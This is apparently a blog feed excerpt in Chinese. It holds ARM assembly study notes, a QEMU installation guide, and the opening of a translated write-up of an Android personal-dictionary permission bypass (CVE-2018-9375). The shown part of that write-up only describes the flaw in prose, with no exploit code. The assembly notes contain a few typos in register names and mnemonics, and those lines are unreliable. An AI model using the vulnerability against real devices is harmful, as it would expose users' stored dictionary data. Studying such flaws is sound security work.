&lt;td&gt;LS&lt;/td&gt;
&lt;td&gt;C清零Z置位&lt;/td&gt;
&lt;td&gt;无符号数小于或等于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1010&lt;/td&gt;
&lt;td&gt;GE&lt;/td&gt;
&lt;td&gt;N等于V&lt;/td&gt;
&lt;td&gt;带符号数大于或等于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1011&lt;/td&gt;
&lt;td&gt;LT&lt;/td&gt;
&lt;td&gt;N不等于V&lt;/td&gt;
&lt;td&gt;带符号数小于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1100&lt;/td&gt;
&lt;td&gt;GT&lt;/td&gt;
&lt;td&gt;Z清零且（N等于V）&lt;/td&gt;
&lt;td&gt;带符号数大于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1101&lt;/td&gt;
&lt;td&gt;LE&lt;/td&gt;
&lt;td&gt;Z置位或（N不等于V）&lt;/td&gt;
&lt;td&gt;带符号数小于或等于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1110&lt;/td&gt;
&lt;td&gt;AL&lt;/td&gt;
&lt;td&gt;忽略&lt;/td&gt;
&lt;td&gt;无条件执行&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&#34;程序结构&#34;&gt;程序结构&lt;/h3&gt;

&lt;p&gt;Android平台采用的是GUN ARM汇编格式，汇编器为GAS&lt;/p&gt;

&lt;p&gt;参数传递：R0-R3这4个寄存器用来传递函数调用的第1到4个参数，超出的参数通过堆栈来传递。R0还用来存放函数调用的返回值。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810112712.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;汇编器指令&#34;&gt;汇编器指令&lt;/h5&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.file&lt;/code&gt;:源文件名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.align&lt;/code&gt;:代码对齐方式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.ascii&lt;/code&gt;:声明字符串&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.global&lt;/code&gt;:声明全局符号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.type&lt;/code&gt;：指定符号的类型&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.word&lt;/code&gt;：存放地址值&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.size&lt;/code&gt;：设置指定符号的大小&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.ident&lt;/code&gt;：编译器标识&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;寻址方式&#34;&gt;寻址方式&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;立即寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;MOV R0, #1234&lt;/code&gt;     -&amp;gt;R0=1234&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;寄存器寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;MOV R1 = R2&lt;/code&gt;   -&amp;gt;R0=R1&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;寄存器移位寻址&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;LSL ：逻辑左移，移位后寄存器空出的低位补0&lt;/li&gt;
&lt;li&gt;LSR：逻辑右移，移位后寄存器空出的高位补0&lt;/li&gt;
&lt;li&gt;ASR：算术右移，移位过程中符号位保持不变，若源操作数为正数，则移位后空出的高位补0，否则补1。&lt;/li&gt;
&lt;li&gt;ROR：循环右移，移位后移出的低位填入移位空出的高位。&lt;/li&gt;
&lt;li&gt;RRX：带扩展的循环右移，操作数右移一位，移出的空位用C标志的值填充。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;MOV R0, R1, LSL #2&lt;/code&gt;  -&amp;gt;R1左移两位（R1&amp;lt;&amp;lt;2）赋值给R0,相当于R0 = R1*4&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;寄存器间接寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;LDR RO, [R1]&lt;/code&gt;  -&amp;gt;将R1寄存器的数值作为地址，取出此地址中的值赋给R0寄存器&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;基址寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;多用于查表、数组访问操作。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;LDR R0, [R1,#-4]&lt;/code&gt; -&amp;gt;将R1寄存器的数值减4作为地址，取出此地址的值赋给R0寄存器。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;多寄存器寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一条指令最多完成16个通用寄存器值的传送。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;LDMIA R0,{R1,R2,R3,R4}&lt;/code&gt; -&amp;gt;LDM为数据加载指令，指令的后缀IA表示每次执行完加载操作后R0寄存器的值自增1个字，ARM指令集中，子表示的是一个32位数值。这条指令作用为：R1 = [R0],R2 = [R0+#4],R3 = [R0+#8],R4 = [R0+#12]。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;堆栈寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;特定的指令来完成：&lt;code&gt;LDMFA/STMFA&lt;/code&gt;、&lt;code&gt;LDMEA/STMEA&lt;/code&gt;、&lt;code&gt;LDMFD/STMFD&lt;/code&gt;、&lt;code&gt;LDMED/STMED&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;LDM和STM为指令前缀，表示多寄存器寻址，即一次传送多个寄存器的值。后面的后缀为指令后缀。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;STMFD SP!, {R1-R7,LR}&lt;/code&gt;  -&amp;gt;将R1~R7,LR入栈，多用于保存子程序的现场。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;LDMFD SP!, {R1-R7,LR}&lt;/code&gt; -&amp;gt;出栈，恢复现场。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;块拷贝寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;实现从连续地址数据从存储器的某一位置拷贝到另外一个位置，指令有：&lt;code&gt;LDMIA/STMIA&lt;/code&gt;、&lt;code&gt;LDMDA/STMDA&lt;/code&gt;、&lt;code&gt;LDMIB/STMIB&lt;/code&gt;、&lt;code&gt;LDMDB/STMDB&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;LDMIA R0! {R0-R3}&lt;/code&gt;  从R0寄存器指向的存储单元中读取3个字到R1-R3寄存器&lt;/p&gt;

&lt;p&gt;&lt;code&gt;STMIA R0! {R0-R3}&lt;/code&gt; 存储从R1-R3寄存器的内容到R0寄存器指向的存储单元&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;相对寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以程序计数器PC的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到操作数的有效地址。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  BL NEXT
    ····
  NEXT:
    ········
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;arm和thumb指令集&#34;&gt;ARM和Thumb指令集&lt;/h3&gt;

&lt;h5 id=&#34;基本指令简述&#34;&gt;基本指令简述&lt;/h5&gt;

&lt;p&gt;&lt;code&gt;MNEMONIC{S}{condition} {Rd}, Operand1, Operand2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;助记符{是否使用CPSR}{是否条件执行以及条件} {目的寄存器}, 操作符1, 操作符2&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;MNEMONIC     - 指令的助记符如ADD&lt;/p&gt;

&lt;p&gt;{S}                      - 可选的扩展位，如果指令后加了S，则需要依据计算结果更新CPSR寄存器中的条件跳转相关    的FLAG&lt;/p&gt;

&lt;p&gt;{condition}        - 如果机器码要被条件执行，那它需要满足的条件标示&lt;/p&gt;

&lt;p&gt;{Rd}                    - 存储结果的目的寄存器&lt;/p&gt;

&lt;p&gt;Operand1     - 第一个操作数，寄存器或者是一个立即数&lt;/p&gt;

&lt;p&gt;Operand2     - 第二个(可变的)操作数，可以是一个立即数或者寄存器或者有偏移量的寄存器&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;第二操作数还有如下操作：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;#123                    - 立即数
Rx                      - 寄存器比如R1
Rx, ASR n               - 对寄存器中的值进行算术右移n位后的值
Rx, LSL n               - 对寄存器中的值进行逻辑左移n位后的值
Rx, LSR n               - 对寄存器中的值进行逻辑右移n位后的值
Rx, ROR n               - 对寄存器中的值进行循环右移n位后的值
Rx, RRX                 - 对寄存器中的值进行带扩展的循环右移1位后的值
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;ADD   R0, R1, R2         - 将第一操作数R1的内容与第二操作数R2的内容相加，将结果存储到R0中。
ADD   R0, R1, #2         - 将第一操作数R1的内容与第二操作数一个立即数相加，将结果存到R0中
MOVLE R0, #5             - 当满足条件LE(Less and Equal,小于等于0)将第二操作数立即数5移动到R0中,注意这条指令与MOVLE R0, R0, #5相同
MOV   R0, R1, LSL #1     - 将第二操作数R1寄存器中的值逻辑左移1位后存入R0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810144732.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;内存访问相关指令&#34;&gt;内存访问相关指令&lt;/h5&gt;

&lt;p&gt;通常，LDR被用来从内存中加载数据到寄存器，STR被用作将寄存器的值存放到内存中。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810145231.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;例子：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.data          /* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*/
var1: .word 3  /* 内存中的第一个变量 */
var2: .word 4  /* 内存中的第二个变量 */
.text          /* 代码段开始 */ 
.global _start
_start:
    ldr r0, adr_var1  @ 将存放var1值的地址adr_var1加载到寄存器R0中 
    ldr r1, adr_var2  @ 将存放var2值的地址adr_var2加载到寄存器R1中 
    ldr r2, [r0]      @ 将R0所指向地址中存放的0x3加载到寄存器R2中  
    str r2, [r1]      @ 将R2中的值0x3存放到R1做指向的地址 
    bkpt             
adr_var1: .word var1  /* var1的地址助记符 */
adr_var2: .word var2  /* var2的地址助记符 */
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810145711.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810154906.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;第一种偏移形式：立即数作偏移&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  STR    Ra, [Rb, imm]
  LDR    Ra, [Rc, imm]
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  
  .data
  var1: .word 3
  var2: .word 4
  .text
  .global _start
  _start:
      ldr r0, adr_var1  @ 将存放var1值的地址adr_var1加载到寄存器R0中 
      ldr r1, adr_var2  @ 将存放var2值的地址adr_var2加载到寄存器R1中 
      ldr r2, [r0]      @ 将R0所指向地址中存放的0x3加载到寄存器R2中  
      str r2, [r1, #2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。
      str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1=R1+4。
      ldr r3, [r1], #4  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1=R1+4。
      bkpt
  adr_var1: .word var1
  adr_var2: .word var2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810160844.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;第二种偏移形式：寄存器作偏移&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  STR    Ra, [Rb, Rc]
  LDR    Ra, [Rb, Rc]
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  .data
  var1: .word 3
  var2: .word 4
  .text
  .global _start
  _start:
      ldr r0, adr_var1  @ 将存放var1值的地址adr_var1加载到寄存器R0中 
      ldr r1, adr_var2  @ 将存放var2值的地址adr_var2加载到寄存器R1中 
      ldr r2, [r0]      @ 将R0所指向地址中存放的0x3加载到寄存器R2中  
      str r2, [r1, r2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 
      str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1=R1+R2。
      ldr r3, [r1], r2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1=R1+R2。
      bx lr
  adr_var1: .word var1
  adr_var2: .word var2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810162217.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;第三种偏移形式：寄存器缩放值作偏移&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  LDR    Ra, [Rb, Rc, &amp;lt;shifter&amp;gt;]
  STR    Ra, [Rb, Rc, &amp;lt;shifter&amp;gt;]
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  .data
  var1: .word 3
  var2: .word 4
  .text
  .global _start
  _start:
      ldr r0, adr_var1         @ 将存放var1值的地址adr_var1加载到寄存器R0中 
      ldr r1, adr_var2         @ 将存放var2值的地址adr_var2加载到寄存器R1中 
      ldr r2, [r0]             @ 将R0所指向地址中存放的0x3加载到寄存器R2中  
      str r2, [r1, r2, LSL#2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。
      str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2&amp;lt;&amp;lt;2。
      ldr r3, [r1], r2, LSL#2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 = R1 + R2&amp;lt;&amp;lt;2。
      bkpt
  adr_var1: .word var1
  adr_var2: .word var2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810162414.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;如何区分取址模式：&lt;/p&gt;

&lt;p&gt;如果有一个叹号!，那就是索引前置取址模式，即使用计算后的地址，之后更新基址寄存器。&lt;/p&gt;

&lt;p&gt;如果在[]外有一个寄存器，那就是索引后置取址模式，即使用原有基址寄存器重的地址，之后再更新基址寄存器&lt;/p&gt;

&lt;p&gt;除此之外，就都是偏移取址模式了&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;关于PC相对取址的LDR指令&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有时候LDR并不仅仅被用来从内存中加载数据。还有如下这操作:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  .section .text
  .global _start
  _start:
     ldr r0, =jump        /* 加载jump标签所在的内存位置到R0 */
     ldr r1, =0x68DB00AD  /* 加载立即数0x68DB00AD到R1 */
  jump:
     ldr r2, =511         /* 加载立即数511到R2 */ 
     bkpt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这些指令学术上被称作伪指令。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;在ARM中使用立即数的规律&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在ARM中不能像X86那样直接将立即数加载到寄存器中。因为你使用的立即数是受限的。&lt;/p&gt;

&lt;p&gt;立即数的值：v = n ror 2*r 有效的立即数都可以通过循环右移来得到&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  #256        // 1 循环右移 24位 --&amp;gt; 256
  #384        // 6 循环右移 26位 --&amp;gt; 384
  #484        // 121 循环右移 30位 --&amp;gt; 484
  #16384      // 1 循环右移 18位 --&amp;gt; 16384
  #2030043136 // 121 循环右移 8位 --&amp;gt; 2030043136
  #0x06000000 // 6 循环右移 8位 --&amp;gt; 100663296 (十六进制值0x06000000)
  Invalid values:
  #370        // 185 循环右移 31位 --&amp;gt; 31不在范围内 (0 – 30)
  #511        // 1 1111 1111 --&amp;gt; 比特模型不符合
  #0x06010000 // 1 1000 0001.. --&amp;gt; 比特模型不符合
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样并不能一次性加载所有的32位值。不过我们可以通过以下的两个选项来解决这个问题：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;用小部分去组成更大的值。    MOV r0, #511  将511分成两部分：MOV r0, #256, and ADD r0, #255&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.section .text
.global _start
_start:
 mov r0, #256   /* 1 ror 24 = 256, so it&#39;s valid */
 add r0, #255   /* 255 ror 0 = 255, valid. r0 = 256 + 255 = 511 */
 ldr r1, =511   /* load 511 from the literal pool using LDR */
 bkpt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;计算立即数的有效值脚本：&lt;a href=&#34;https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py&#34;&gt;https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;azeria@labs:~$ python rotator.py
Enter the value you want to check: 511
Sorry, 511 cannot be used as an immediate number and has to be split.
azeria@labs:~$ python rotator.py
Enter the value you want to check: 256
The number 256 can be used as a valid immediate number.
1 ror 24 --&amp;gt; 256
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;下面的部分指令用到在详细查，记的话脑壳痛&lt;/p&gt;

&lt;p&gt;##### 跳转指令&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;B&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BX&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BXL&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;##### 存储器操作指令&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;LDM&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;STM&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PUSH&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;POP&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SWP&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;##### 数据处理&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;MOV&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MVN&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ADD&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ADC&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SUB&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RSB&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SBC&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RSC&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MUL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MLS&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MLA&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;UMULL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;UMLAL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SMUULL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SMLAL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SMLAD&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SMLSD&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SDIV&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;UDIV&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ASR&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AND&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ORR&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;EOR&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BIC&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LSL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LSR&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RRX&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ROR&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CMP&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CMN&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;TSL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;TEQ&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;##### 其他指令&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;SWI&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;code&gt;NOP&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;code&gt;MRS&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;code&gt;MSR&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;###&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>QEMU的安装使用</title>
      <link>https://naivete.cc/post/qume%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Thu, 09 Aug 2018 19:34:34 +0800</pubDate>
      
      <guid>https://naivete.cc/post/qume%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</guid>
      
        <description>

&lt;h1 id=&#34;qemu的安装使用&#34;&gt;QEMU的安装使用&lt;/h1&gt;

&lt;h3 id=&#34;安装&#34;&gt;安装&lt;/h3&gt;

&lt;p&gt;WIndows：&lt;a href=&#34;https://qemu.weilnetz.de/w64/&#34;&gt;https://qemu.weilnetz.de/w64/&lt;/a&gt; 下载exe安装就行&lt;/p&gt;

&lt;p&gt;MACOS:&lt;code&gt;brew install qemu&lt;/code&gt;  or &lt;code&gt;sudo port install qemu&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;LINUX：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Arch:&lt;/strong&gt; &lt;code&gt;pacman -S qemu&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Debian/Ubuntu:&lt;/strong&gt; &lt;code&gt;apt-get install qemu&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Fedora:&lt;/strong&gt; &lt;code&gt;dnf install @virtualization&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Gentoo:&lt;/strong&gt; &lt;code&gt;emerge --ask app-emulation/qemu&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;RHEL/CentOS:&lt;/strong&gt; &lt;code&gt;yum install qemu-kvm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SUSE:&lt;/strong&gt; &lt;code&gt;zypper install qemu&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;源码安装：&lt;a href=&#34;https://download.qemu.org/&#34;&gt;https://download.qemu.org/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;wget&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;wget https://download.qemu.org/qemu-3.0.0-rc1.tar.xz
tar xvJf qemu-3.0.0-rc1.tar.xz
cd qemu-3.0.0-rc1
./configure
make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;git&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git clone git://git.qemu.org/qemu.git
cd qemu
git submodule init
git submodule update --recursive
./configure
make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最新的开发发生在主分支上。稳定的树位于名为“稳定x”的分支中。YY分支,X。YY是发布版本。&lt;/p&gt;

&lt;h3 id=&#34;树莓派内核制作-在windows上&#34;&gt;树莓派内核制作（在windows上)&lt;/h3&gt;

&lt;p&gt;下载树莓派系统：&lt;a href=&#34;http://downloads.raspberrypi.org/raspbian/images/&#34;&gt;http://downloads.raspberrypi.org/raspbian/images/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;下载qume 的树莓派内核： &lt;a href=&#34;https://github.com/dhruvvyas90/qemu-rpi-kernel&#34;&gt;https://github.com/dhruvvyas90/qemu-rpi-kernel&lt;/a&gt;   改名为kernel-qemu放在和系统镜像同目录下&lt;/p&gt;

&lt;p&gt;放在了raspbia目录下&lt;/p&gt;

&lt;p&gt;&lt;code&gt;qemu-system-arm.exe -kernel kernel-qemu -cpu arm1176 -m 512 -M versatilepb -dtbversatile-pb.dtb -no-reboot -append &amp;quot;root=/dev/sda2 panic=1rootfstype=ext4 rw&amp;quot; -net nic -net user,hostfwd=tcp::5022-:22 -hda 2018-06-27-raspbian-stretch.img&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;注意自己下载的镜像版本&lt;/p&gt;

&lt;h3 id=&#34;linux上&#34;&gt;Linux上&lt;/h3&gt;

&lt;p&gt;待补充。。。&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>在Android的个人字典中发现和利用漏洞(CVE-2018-9375)</title>
      <link>https://naivete.cc/post/%E8%AF%91%E5%9C%A8android%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9Ecve-2018-9375/</link>
      <pubDate>Sun, 05 Aug 2018 21:16:52 +0800</pubDate>
      
      <guid>https://naivete.cc/post/%E8%AF%91%E5%9C%A8android%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9Ecve-2018-9375/</guid>
      
        <description>

&lt;blockquote&gt;
&lt;p&gt;翻译的文章 渣渣翻译
原作者：Daniel Kachakil&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;我正在审计一款Android手机，审计范围是所有已经安装了的应用程序。我的首选方法是，在时间允许的时候，就手动检查尽可能多的代码。我发现了一个巧妙的漏洞，这个漏洞允许我与一个内容提供者交互，而该内容提供者应该在最近的Android版本中受到保护：用户的个人词典，它存储了用户想要保留的非标准单词的拼写。&lt;/p&gt;

&lt;p&gt;虽然理论上应该只授权给特权用户、授权的输入法编辑器(IMEs) ，以及拼写检查程序访问用户的个人词典，但是有一种方法可以绕过这些限制，允许恶意应用程序更新、删除甚至检索字典内的所有内容。而不需要任何权限或者与用户交互。&lt;/p&gt;

